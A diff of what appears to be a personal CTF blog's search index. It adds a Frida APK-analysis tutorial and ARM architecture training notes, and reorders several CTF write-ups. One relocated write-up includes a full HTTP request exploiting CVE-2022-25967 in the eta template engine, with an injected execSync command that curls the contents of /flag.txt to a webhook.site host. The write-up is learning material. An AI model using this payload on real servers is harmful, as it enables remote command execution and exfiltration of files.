@@ -1,9 +1,36 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Bronco CTF 2025</title>
+    <url>/2025/02/17/Bronco-CTF-2025/</url>
+    <content><![CDATA[Web]]></content>
+      <categories>
+        <category>CTF 2025</category>
+      </categories>
+      <tags>
+        <tag>Forensics</tag>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>APK Analysis Frida</title>
     <url>/2025/06/04/APK-Analysis-Frida/</url>
     <content><![CDATA[What is Frida?Frida is a toolkit that enables dynamic interaction with running programs.
+Installing Fridapip install frida-tools
+Then test the installation:
+frida --version
+Next, match your device’s architecture (use adb shell getprop ro.product.cpu.abi)
+adb shell getprop ro.product.cpu.abi
+
+Using Frida for APK Analysis
+Connect your Android device via USB and ensure USB debugging is enabled.
+Start the Frida server on your Android device: adb shellsufrida-server &amp;
+List running processes to find your target app: frida-ps -U
+Attach to the target app using its process ID or name: frida -U -n &lt;app_name&gt;
+Inject scripts to manipulate or analyze the app: frida -U -l your_script.js -n &lt;app_name&gt;
+Use Frida’s REPL to interactively explore the app:     frida -U -n &lt;app_name&gt; -f &lt;app_name&gt; --no-pause
+Write custom scripts to hook functions, modify behavior, or extract data: Java.perform(function() &#123;    var MainActivity = Java.use(&#x27;com.example.app.MainActivity&#x27;);    MainActivity.someMethod.implementation = function() &#123;        console.log(&#x27;someMethod called&#x27;);        return this.someMethod();    &#125;;&#125;);
+
 ]]></content>
   </entry>
   <entry>
@@ -391,143 +418,170 @@ These findings corroborate the assessment that this malware represents a signifi
       </tags>
   </entry>
   <entry>
-    <title>Bronco CTF 2025</title>
-    <url>/2025/02/17/Bronco-CTF-2025/</url>
-    <content><![CDATA[Web]]></content>
-      <categories>
-        <category>CTF 2025</category>
-      </categories>
-      <tags>
-        <tag>Forensics</tag>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CSLU 2024 UPM</title>
-    <url>/2024/12/31/CSLU-2024-UPM/</url>
-    <content><![CDATA[ForensicsDr. Mals
+    <title>Arm-Malaysia On Demand Training</title>
+    <url>/2025/07/28/Arm-Malaysia-On-Demand-Traning/</url>
+    <content><![CDATA[Arm-Malaysia On Demand TrainingDay 1Introduction to ARMARM stands for Advanced RISC Machine, a family of computer processors that are widely used in mobile devices, embedded systems, and increasingly in servers and desktops. ARM processors are known for their power efficiency and performance. Almost 100% of smartphones and tablets use ARM processors, making them a dominant force in the mobile computing market.
+Arm’s Company is a British semiconductor and software design company, known for its ARM architecture. The company designs the ARM architecture and licenses it to other companies like Apple, Samsung, MediaTek and many more.
+Introduction to ARM CPU ArchitectureThe ARM CPU architecture defines a CPU’s behavior when software runs on it.
 
-Download the Dr. Mals word file
-Use Oletools - olevba to decrypt this file
+CPU architecture defines the basic instruction set and the exception and memory models that are relied on by the operating system and hypervisor
+CPU microarchitecture defines the implementation of the CPU architecture, including the pipeline, cache, and other hardware features.
 
+A-profile (Application profile) is used in high-performance applications such as smartphones, tablets, and laptops. It includes features like:
 
+Support for virtual memory
+Support for multiple cores
+Support for SIMD (Single Instruction, Multiple Data) instructions
 
-With the use of CyberChef, we can find out the encoded text
+Mostly targets running a full OS such as Linux
 
+Implementation: Cortex-A, Cortex-X and Neoverse
+Latest Version: Armv9-A and Armv8-A
 
+R-Profile (Real-time profile) is used in real-time applications such as automotive and industrial control systems. It includes features like:
 
-Searching the website and it given
+Low-latency interrupt handling
+Deterministic execution
 
+Targets embedded systems with real-time requirements
 
+Implementation: Cortex-R
+Latest Version: Armv8-R
 
-Lets decode this
-With the use of online decoderwe can find out the flag
+M-profile (Microcontroller profile) is used in microcontrollers and embedded systems. It includes features like:
 
+Low power consumption
 
+Small code size
 
-Thats it.
+Implementation: Cortex-M
 
-AcknowledgementThx to Akram for providing Hint
-RE:Memory Delete
+Latest Version: Armv8-M
 
-First, we download the attached file given by the challenge.
-Challenge.7z
 
+Execution StatesAArch32: AArch32 is the 32-bit execution state of the ARM architecture. It supports both ARM and Thumb instruction sets and is used in a wide range of applications, from embedded systems to mobile devices. Supports T32 and A32 instruction sets.
+AArch64: AArch64 is the 64-bit execution state of the ARM architecture. It supports a new instruction set and is designed for high-performance applications, such as servers and desktops. It is also used in mobile devices that require more memory and processing power. Supports A64 instruction set.
+Big.LITTLE: Big.LITTLE is a heterogeneous computing architecture that combines high-performance cores (big) with power-efficient cores (LITTLE) in a single system-on-chip (SoC). This allows the system to dynamically switch between cores based on workload requirements, optimizing performance and power consumption.
+R-Profile Architecture
+No overlapping memory regions
+New exception model compatible with the Armv8-A model
+Virtualization support
+Memory management unit (MMU) support
 
-Unzip it.-Challenge.ad1 files inside.
-.ad1 is a image files so lets use FTK Imager to find the deleted file
+Cortex-R Processors: Cortex-R82 with memory management unit (MMU) support for OS like Linux
+M-Profile ArchitectureLow-latency, highly deterministic operation
 
-There goes the flag
+Armv8-M Baseline: Introduced the Armv8-M architecture, which includes support for the Armv8-M Security Extension (TrustZone) and the Armv8-M Mainline profile.
+Armv8-M Mainline: Introduced the Armv8-M Mainline profile, which includes support for the Armv8-M Security Extension (TrustZone) and the Armv8-M Baseline profile.
 
-Skyfall
-Pain killer, My Skill issue… XD
+AMBAThe Advanced Microcontroller Bus Architecture (AMBA) is an open standard on-chip interconnect specification for the connection and management of functional blocks in SoC designs.
+AMBA is used to connect different components of a system-on-chip (SoC) design, such as processors, memory, and peripherals. It provides a standard interface for communication between these components, allowing for easier integration and interoperability.
+Why use AMBA?
 
-Download the file attach by the challenge.-capture.pcapng
-Use wireshark to open the pcapng files
-See the clue given, Love the EDITED LEWIS VERSION files and lost the flag.
+Efficient IP reuse: IP reuse is an essential part of SoC design, and AMBA provides a standard interface for communication between different components, allowing for easier integration and interoperability.
+Flexibility: AMBA provides a flexible and scalable architecture that can be used to connect different components of a system-on-chip (SoC) design, allowing for easier integration and interoperability.
+Compatibility: AMBA is a widely used standard in the industry, and many IP cores are designed to be compatible with it, making it easier to integrate different components into a system-on-chip (SoC) design.
 
+Security in Cortex-ACortex-A processors are designed with security features to protect against various threats, including malware and unauthorized access. These features include:
 
+TrustZone: A hardware-based security extension that creates a secure execution environment for sensitive applications, allowing them to run in isolation from the rest of the system.
+Memory Protection Unit (MPU): A hardware component that enforces memory access permissions, preventing unauthorized access to sensitive data.
+Secure Boot: A process that ensures only trusted software is loaded during the boot process, preventing malicious code from executing.
+Cryptographic Acceleration: Hardware support for cryptographic operations, such as encryption and decryption, to enhance security and performance.
 
-File -&gt; Export -&gt; Http, and save all the files.
-we can see there is 5 files exported, 2 text file with word File received successfully! and file_data=16ae9187d13259788a97aef16a7d50f8b6376fbcba92a0f53e7e68d9f562a3a6576a3183a8dc8631c64fbd9147c8b608
-usefull for later
+Armv9-A Architecture for a Rich Secure IoT Ecosystem
+Memory tagging: Support for memory tagging to enhance security and prevent memory-related attacks.
+Secure-EL2: A secure exception level that provides an isolated environment for sensitive operations.
+uArch side-band protection: Hardware-based protection mechanisms to secure microarchitecture elements.
+Crypto support: Enhanced hardware support for cryptographic operations.
+Branch target identifiers: Mechanisms to protect against branch target injection attacks.
+Pointer authentication: Techniques to verify the authenticity of pointers and prevent unauthorized access.
 
+Cortex ISA Progression for ML
+Armv7-A NEON including: 32x64bit register (Cortex-A7)
+Armv8.0-A NEON including AArch32 and AArch64 (Cortex-A53)
+Armv8.2-A NEON including: FP16 support (Cortex-A55)
+Armv9.2-A SVE2 including BF16 support (Cortex-A520)
 
-And there is a file with big data 24,345kb and let us see what file is that.
+SVE2: SIMD Architecture for Next Decade of Devices
+Better Developer experience: SVE2 provides a more flexible and efficient programming model for developers, allowing them to write code that can take advantage of the latest hardware features.
+Better Auto-Vectorization: SVE2 provides better support for auto-vectorization, allowing compilers to generate more efficient code for SIMD operations.
 
+Scalable Matrix Extension (SME)SME2 execution unit in CPU cluster
 
+Matrix outer product
+Shared between all the CPUs
+All CPUs have access to the engine
+Transparent to OS
 
+(Resource from ARM Scalable Matrix Extension SME introduction)
+Benefits of SME2 in CPU
+Performance: SME2 provides a significant performance boost for matrix operations, which are commonly used in machine learning and AI applications.
+Flexibility &amp; Future-Proof: SME2 is designed to be flexible and future-proof, allowing it to adapt to new workloads and use cases as they emerge.
+Developer Efficiency: SME2 provides tools and features that enhance developer productivity, making it easier to write and optimize code for matrix operations.
+Security: SME2 includes security features to protect against potential threats and vulnerabilities, ensuring the integrity and confidentiality of data processed by the engine.
+
+Software StackCortex-A software stack for Hayas composed of:
+
+ML: TFL runtime ONNX, TVM, ArmNN, ACL
+Computer Vision: OpenCV, ACL
+Security: TF-A, OP-TEE, Secure Partition Manager
+
+Arm Kleidi Libraries
+Arm Kleidi AI
+Arm Kleidi CV
+
+&#x2F;&#x2F;write more about Arm Kleidi AI and CV
+Cortex-R BenefitsCortex-R processors are designed for real-time applications, providing low-latency and deterministic performance. They are used in applications such as automotive, industrial control systems, and medical devices.
+Key Benefits
+Fast and deterministic response times: Cortex-R processors are designed to provide fast and deterministic response times, making them ideal for real-time applications.
+Real-time performance: Tightly coupled memory, low latency peripheral ports, and a low-latency interrupt controller.
+High reliability and fault tolerance: Cortex-R processors are designed to be highly reliable and fault-tolerant, making them ideal for applications that require high reliability and fault tolerance.
+
+Applications of Cortex-R Processors
+Automotive: Cortex-R processors are used in automotive applications such as advanced driver assistance systems (ADAS), electronic stability control (ESC), and anti-lock braking systems (ABS).
+Industrial control systems: Cortex-R processors are used in industrial control systems such as robotics, factory automation, and process control.
+Medical devices: Cortex-R processors are used in medical devices such as patient monitoring systems, infusion pumps, and imaging systems.
+Other applications: Automotive, modem, storage, healthcare, industrial control systems, and more.
+
+The latest Cortex-R82AE features 64-bit architecture with enhanced functional safety capabilities, virtual memory management, full system coherency, and native 64-bit instruction execution support.
+Note: Cortex-A MMU is required for HLOS e.g. Linux&#x2F;Android while Cortex-R typically runs on RTOS like FreeRTOS, Zephyr, and others.
+Functional Safety
+Systematic Errors Protection
+Integrated Safety Mechanisms
+Fault Detection and Recovery
+
+Cortex-MCortex-M is the most units shipped in the world, with over 200 billion units shipped since its introduction in 2004. It is used in a wide range of applications, including consumer electronics, automotive, industrial control systems, and medical devices.
+Cortex-M processors are designed for low-power, low-cost applications, providing a balance between performance and power efficiency. They are used in applications such as IoT devices, wearables, and smart home devices.
+Applications of Cortex-M Processors
+Energy grid, automotive, consumer electronics, industrial control systems, healthcare, retail, smart city, VR&#x2F;AR, connected clothing and more.
+
+Factors to Choose Suitable Cortex-MWhen selecting the appropriate Cortex-M processor for your application, consider these key factors:
+
+Cost&#x2F;Die Area: Smaller die size reduces manufacturing costs, making it ideal for high-volume consumer products
+Low Power: Ultra-low power consumption extends battery life for IoT devices and wearables
+DSP Capabilities: Built-in digital signal processing features for audio, sensor data, and control algorithms
+Security: Hardware security features like TrustZone-M for secure boot and data protection
+Performance: Processing speed and efficiency for real-time applications and responsiveness
+ML Support: Machine learning acceleration for edge AI applications and intelligent sensing
+
+Arm Heliumarm.com&#x2F;resource&#x2F;ebook&#x2F;helium-mve-reference-book
+
+In DSP&#x2F;ML performance
+x2 datapath increase
+Achieve a x4 uplift in DSP&#x2F;ML performance
+
+Open Source Libraries Supporting Helium
+CMSIS-DSP: CMSIS-DSP is a library of DSP functions optimized for Cortex-M processors, providing efficient implementations of common DSP algorithms.
+CMSIS-Stream and CMSIS-NN: CMSIS-Stream and CMSIS-NN are libraries for machine learning and neural network applications on Cortex-M processors, providing optimized implementations of common ML algorithms.
+Arm-2D Graphics Library: The Arm-2D graphics library is a lightweight, high-performance graphics library for Cortex-M processors, providing efficient rendering of 2D graphics.
+
+Summary
+Cortex-M spans the spectrum of embedded applications
+Drives up energy efficiency
+High performance
 
-
-Looks like it is a elf file  
-I manage to find a website to extract the elf file EzyZIP
-We can see the largest file is here after extract
-
-
-After have a long time searching, i cant found any ways to extract pydata… skill issue XD
-
-
-After the end of the day, my friend told me there is something call Pyinstxtractor that can extract it.
-
-This is what i found
-
-
-okayyyy here is it
-
-
-
-Theres alot files inside, but the one the name skyfall-lewis-edited-version.pyc is the most suspicious.
-
-
-
-With the use of this website Pylingual, i transfer pyc files to py
-
-
-
-We can see it is a AES encyption function and the key is the time which the user encrypt when downloaded, so lets go back to wireshark and find the date when she successfuly download.
-
-We can find out that the epoch for the time she download the file is 1733988750
-
-
-Then use GPT xd find the key out
-
-ps: I also dk why need to use 1733988749 just told by my friend to use it cant find any things that support this epoch XD.
-
-
-Okay, then let us go to decrypt it. Use cyberchef
-Heres the flag.Okay its maybe abit harder than i though. cry die.
-
-AcknowledgementThx to Bakayang for providing solution at the end of the day
-WEBUseless Website
-
-Download the source code of the website
-
-We can see theres something in the package.json file
-
-
-
-
-Searching on the internet CVE-2022-25967 showing that there is some leakage can be use on the eta framework.
-
-In burpsuite, intercept the web and change to this
-/utils/settings HTTP/1.1Host: 5.75.155.50:1341User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: keep-aliveContent-Type: application/jsonUpgrade-Insecure-Requests: 1If-None-Match: W/&quot;1057-ih1IUXlwncna8aHynJLYIHjiX30&quot;Priority: u=0, iContent-Length: 292&#123;  &quot;settings&quot;: &#123;    &quot;view options&quot;: &#123;      &quot;varName&quot;: &quot;x=process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;curl https://webhook.site/self id/$(cat /flag.txt)&#x27;)&quot;,      &quot;include&quot;: false,      &quot;includeFile&quot;: false,      &quot;useWith&quot;: true    &#125;  &#125;&#125;
-
-And we can find out the flag at the end of the webhook link.
-
-
-CSLU&#123;wh4ts_y0ur_et4?&#125;
-
-
-
-AcknowledgementThx for Megat for the solution.
 ]]></content>
-      <categories>
-        <category>CTF 2024</category>
-      </categories>
-      <tags>
-        <tag>Forensics</tag>
-        <tag>Web</tag>
-      </tags>
   </entry>
   <entry>
     <title>CyberX Internal CTF 2024</title>
@@ -752,14 +806,6 @@ There you go the flag!!
       </tags>
   </entry>
   <entry>
-    <title>PICO CTF 2025</title>
-    <url>/2025/03/08/PICO-CTF/</url>
-    <content><![CDATA[[Forensics]]]></content>
-      <tags>
-        <tag>CTF 2025</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>EQFCTF 2025</title>
     <url>/2025/01/18/EQFCTF-2025/</url>
     <content><![CDATA[MiscJoin Our Discord
@@ -839,6 +885,147 @@ And thats the flag EQCTF{Int3RcEpT_da_Tr3FfiC}”
       </tags>
   </entry>
   <entry>
+    <title>PICO CTF 2025</title>
+    <url>/2025/03/08/PICO-CTF/</url>
+    <content><![CDATA[[Forensics]]]></content>
+      <tags>
+        <tag>CTF 2025</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CSLU 2024 UPM</title>
+    <url>/2024/12/31/CSLU-2024-UPM/</url>
+    <content><![CDATA[ForensicsDr. Mals
+
+Download the Dr. Mals word file
+Use Oletools - olevba to decrypt this file
+
+
+
+With the use of CyberChef, we can find out the encoded text
+
+
+
+Searching the website and it given
+
+
+
+Lets decode this
+With the use of online decoderwe can find out the flag
+
+
+
+Thats it.
+
+AcknowledgementThx to Akram for providing Hint
+RE:Memory Delete
+
+First, we download the attached file given by the challenge.
+Challenge.7z
+
+
+Unzip it.-Challenge.ad1 files inside.
+.ad1 is a image files so lets use FTK Imager to find the deleted file
+
+There goes the flag
+
+Skyfall
+Pain killer, My Skill issue… XD
+
+Download the file attach by the challenge.-capture.pcapng
+Use wireshark to open the pcapng files
+See the clue given, Love the EDITED LEWIS VERSION files and lost the flag.
+
+
+
+File -&gt; Export -&gt; Http, and save all the files.
+we can see there is 5 files exported, 2 text file with word File received successfully! and file_data=16ae9187d13259788a97aef16a7d50f8b6376fbcba92a0f53e7e68d9f562a3a6576a3183a8dc8631c64fbd9147c8b608
+usefull for later
+
+
+And there is a file with big data 24,345kb and let us see what file is that.
+
+
+
+
+
+Looks like it is a elf file  
+I manage to find a website to extract the elf file EzyZIP
+We can see the largest file is here after extract
+
+
+After have a long time searching, i cant found any ways to extract pydata… skill issue XD
+
+
+After the end of the day, my friend told me there is something call Pyinstxtractor that can extract it.
+
+This is what i found
+
+
+okayyyy here is it
+
+
+
+Theres alot files inside, but the one the name skyfall-lewis-edited-version.pyc is the most suspicious.
+
+
+
+With the use of this website Pylingual, i transfer pyc files to py
+
+
+
+We can see it is a AES encyption function and the key is the time which the user encrypt when downloaded, so lets go back to wireshark and find the date when she successfuly download.
+
+We can find out that the epoch for the time she download the file is 1733988750
+
+
+Then use GPT xd find the key out
+
+ps: I also dk why need to use 1733988749 just told by my friend to use it cant find any things that support this epoch XD.
+
+
+Okay, then let us go to decrypt it. Use cyberchef
+Heres the flag.Okay its maybe abit harder than i though. cry die.
+
+AcknowledgementThx to Bakayang for providing solution at the end of the day
+WEBUseless Website
+
+Download the source code of the website
+
+We can see theres something in the package.json file
+
+
+
+
+Searching on the internet CVE-2022-25967 showing that there is some leakage can be use on the eta framework.
+
+In burpsuite, intercept the web and change to this
+/utils/settings HTTP/1.1Host: 5.75.155.50:1341User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: keep-aliveContent-Type: application/jsonUpgrade-Insecure-Requests: 1If-None-Match: W/&quot;1057-ih1IUXlwncna8aHynJLYIHjiX30&quot;Priority: u=0, iContent-Length: 292&#123;  &quot;settings&quot;: &#123;    &quot;view options&quot;: &#123;      &quot;varName&quot;: &quot;x=process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;curl https://webhook.site/self id/$(cat /flag.txt)&#x27;)&quot;,      &quot;include&quot;: false,      &quot;includeFile&quot;: false,      &quot;useWith&quot;: true    &#125;  &#125;&#125;
+
+And we can find out the flag at the end of the webhook link.
+
+
+CSLU&#123;wh4ts_y0ur_et4?&#125;
+
+
+
+AcknowledgementThx for Megat for the solution.
+]]></content>
+      <categories>
+        <category>CTF 2024</category>
+      </categories>
+      <tags>
+        <tag>Forensics</tag>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Readme</title>
+    <url>/2024/12/31/Readme/</url>
+    <content><![CDATA[This is my First Post in my Website!!There will be Writeup for my CTF Challenge and maybe some Learning stuff I Guess???
+]]></content>
+  </entry>
+  <entry>
     <title>Try Hack Me Hackinfinity Battle CTF 2025</title>
     <url>/2025/03/19/Try-Hack-Me-Hackinfinity-Battle-CTF-2025/</url>
     <content><![CDATA[WebNotePad Online
@@ -854,12 +1041,6 @@ after image search on google, we found that it is at brazil, beco do batman.
 Google search beco do batman burger restaurant shows some restaurant name but first is coringa do beco.
 Flag &#x3D; THM{coringa_do_beco}
 
-]]></content>
-  </entry>
-  <entry>
-    <title>Readme</title>
-    <url>/2024/12/31/Readme/</url>
-    <content><![CDATA[This is my First Post in my Website!!There will be Writeup for my CTF Challenge and maybe some Learning stuff I Guess???
 ]]></content>
   </entry>
   <entry>
